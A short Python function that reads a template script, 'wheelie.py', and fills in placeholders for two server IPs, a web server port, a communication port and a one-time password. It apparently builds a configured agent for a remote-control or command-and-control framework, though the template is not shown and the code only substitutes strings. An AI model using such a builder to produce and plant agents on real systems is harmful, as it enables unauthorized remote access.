import os


def build(soundwave_ip: str, web_server_port: str, ravage_ip: str, communication_port: int, one_time_password: str) -> str:
    with open(os.path.join(os.path.dirname(__file__), 'wheelie.py')) as fh:
        data = ''.join(fh.readlines())
    for s, r in (
            ('<>SOUNDWAVE_IP</>', soundwave_ip),
            ('<>WEB_SERVER_PORT</>', web_server_port),
            ('<>RAVAGE_IP</>', ravage_ip),
            ('<>COMMUNICATION_PORT</>', communication_port),
            ('<>ONE_TIME_PASSWORD</>', one_time_password)
    ):
        data = data.replace(s, str(r))
    return data
